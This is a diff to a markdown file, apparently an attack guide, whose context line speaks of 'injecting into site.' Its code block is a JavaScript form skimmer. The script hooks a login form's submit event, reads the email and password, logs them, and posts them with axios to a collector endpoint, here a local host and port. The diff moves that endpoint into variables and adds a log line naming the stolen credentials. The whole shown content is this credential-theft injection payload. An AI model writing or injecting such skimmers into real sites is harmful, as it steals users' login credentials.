@@ -20,11 +20,16 @@ Use this site to remove newlines before injecting into site.
 ```html
 <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
-  document.getElementById('loginForm').addEventListener('submit', function(event) {
+document.getElementById('loginForm').addEventListener('submit', function(event) {
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
-    
-    axios.post('http://127.0.0.1:8080', {
+    var remoteHost = 'http://127.0.0.1';
+    var remotePort = '8080';
+    var remoteSocket = remoteHost + ':' + remotePort;
+
+    console.log(`Sending credentials ${email} and ${password} to ${remoteSocket}`); 
+
+    axios.post(remoteSocket, {
         email: email,
         password: password
     })
@@ -34,7 +39,7 @@ Use this site to remove newlines before injecting into site.
     .catch(function (error) {
         console.log(error);
     });
-  });
+});
 </script>
 ```
 
